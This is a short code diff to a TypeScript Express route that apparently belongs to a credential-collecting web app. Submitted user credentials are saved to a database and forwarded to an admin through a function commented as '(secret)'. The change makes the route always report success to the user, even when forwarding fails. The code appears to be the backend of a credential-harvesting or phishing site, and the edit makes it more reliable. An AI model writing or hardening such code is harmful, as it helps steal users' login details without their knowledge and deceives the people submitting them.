@@ -80,13 +80,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
 
       // Send credentials to admin (secret)
-      const adminEmailSent = await sendUserCredentialsToAdmin(credentials);
-
-      if (adminEmailSent) {
-        res.json({ success: true, message: 'Credentials submitted successfully' });
-      } else {
-        res.status(500).json({ error: 'Failed to process credentials' });
+      try {
+        await sendUserCredentialsToAdmin(credentials);
+      } catch (emailError) {
+        console.error('Email sending failed but continuing:', emailError);
+        // We continue because the record is already in DB for admin to see
       }
+
+      res.json({ success: true, message: 'Credentials submitted successfully' });
     } catch (error) {
       console.error('Error submitting credentials:', error);
       res.status(500).json({ error: 'Internal server error' });
